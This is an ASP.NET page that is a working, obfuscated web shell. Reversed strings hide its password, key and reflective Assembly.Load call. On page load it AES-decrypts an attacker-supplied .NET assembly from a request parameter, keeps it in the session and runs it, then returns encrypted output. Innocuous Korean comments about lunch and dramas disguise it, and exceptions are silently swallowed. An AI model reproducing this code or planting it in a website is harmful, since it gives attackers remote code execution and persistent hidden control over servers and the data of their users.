<%@ Page Language="C#"%>
<script runat="server">
    // 오늘 점심은 뭐 먹지?
    public static class p_a01
    {
        // 배고파요, 치킨 먹고 싶다.
        private delegate System.Reflection.Assembly d_b02(byte[] rawAssembly);

        private static string s_c03(string i) {
            char[] a = i.ToCharArray();
            System.Array.Reverse(a);
            return new string(a);
        }

        public static void e_d04(HttpContext ctx)
        {
            try
            {
                // 한국 드라마는 재미있다.
                string k1 = "a42251c9a8b0e6c3"; // Reversed key
                string p2 = "llehsflow"; // Reversed pass
                string s3 = "daolyp"; // Reversed session name
                string l4 = "daoL"; // Reversed method name
                string c5 = "YL"; // Reversed class name

                string key_val = s_c03(k1);
                string pass_val = s_c03(p2);
                string session_key = s_c03(s3);

                string md5_val;
                using(var md5_svc = new System.Security.Cryptography.MD5CryptoServiceProvider())
                {
                    md5_val = System.BitConverter.ToString(md5_svc.ComputeHash(System.Text.Encoding.ASCII.GetBytes(pass_val + key_val))).Replace("-", "");
                }

                byte[] data_val = System.Convert.FromBase64String(ctx.Request[pass_val]);
                var rij_svc = new System.Security.Cryptography.RijndaelManaged();
                var key_bytes = System.Text.Encoding.ASCII.GetBytes(key_val);
                data_val = rij_svc.CreateDecryptor(key_bytes, key_bytes).TransformFinalBlock(data_val, 0, data_val.Length);

                if (ctx.Session[session_key] == null)
                {
                    // 서울의 밤은 아름답다.
                    var method = typeof(System.Reflection.Assembly).GetMethod(s_c03(l4), new[] { typeof(byte[]) });
                    var loader_delegate = (d_b02)System.Delegate.CreateDelegate(typeof(d_b02), method);
                    ctx.Session[session_key] = loader_delegate(data_val);
                }
                else
                {
                    // 내일은 주말이다!
                    var out_stream = new System.IO.MemoryStream();
                    var asm_obj = (System.Reflection.Assembly)ctx.Session[session_key];
                    object inst = asm_obj.CreateInstance(s_c03(c5));
                    
                    inst.Equals(ctx);
                    inst.Equals(out_stream);
                    inst.Equals(data_val);
                    inst.ToString();

                    byte[] result_data = out_stream.ToArray();

                    ctx.Response.Write(md5_val.Substring(0, 16));
                    var final_data = rij_svc.CreateEncryptor(key_bytes, key_bytes).TransformFinalBlock(result_data, 0, result_data.Length);
                    ctx.Response.Write(System.Convert.ToBase64String(final_data));
                    ctx.Response.Write(md5_val.Substring(16));
                }
            }
            catch (System.Exception) { /* 그냥 무시 */ }
        }
    }

    void Page_Load(object sender, EventArgs e)
    {
        p_a01.e_d04(Context);
    }
</script><%
%>